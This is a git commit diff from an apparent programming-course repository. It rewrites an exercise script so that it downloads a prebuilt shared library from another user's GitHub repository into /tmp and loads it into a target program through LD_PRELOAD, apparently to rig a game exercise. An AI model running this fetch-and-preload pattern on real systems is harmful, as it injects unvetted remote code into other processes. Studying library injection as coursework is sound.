5ffcd9d3662e982a66ddcb8fde8a757e93369449
Naeyaya <108569079+Naeyaya@users.noreply.github.com>
2022-12-13 21:40:12 +0300

    update

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q -O ../ https://github.com/eadortsu/alx-low_level_programming/blob/main/0x18-dynamic_libraries/libmask.so?raw=true
-export LD_PRELOAD= ../libmask.so
+wget -P /tmp https://github.com/sidneyriffic/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
+export LD_PRELOAD=/tmp/putshack.so
